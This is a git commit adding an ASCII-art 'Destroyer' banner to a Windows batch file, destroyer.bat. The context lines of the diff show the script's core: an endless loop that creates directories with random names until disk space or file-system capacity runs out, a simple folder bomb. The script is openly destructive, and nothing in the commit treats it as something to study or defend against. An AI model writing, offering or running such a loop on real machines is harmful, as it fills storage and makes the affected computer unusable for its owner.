c9dde089cc94b0d8a598bfb80fab0d34ab74bdc3
895potatoboy <berntolsen86@gmail.com>
2026-09-17 20:24:18 +0200

    Add ASCII art banner to destroyer.bat
    Added ASCII art banner to the destroyer.bat script.

--- destroyer.bat
+++ destroyer.bat
@@ -1,4 +1,10 @@
 @echo off
+echo     ___          _                             
+echo    /   \___  ___| |_ _ __ ___  _   _  ___ _ __ 
+echo   / /\ / _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
+echo  / /_//  __/\__ \ |_| | | (_) | |_| |  __/ |   
+echo /___,' \___||___/\__|_|  \___/ \__, |\___|_|   
+echo                                |___/           
 :main:
 mkdir %random%%random%%random%%random%%random%%random%%random%
 goto main
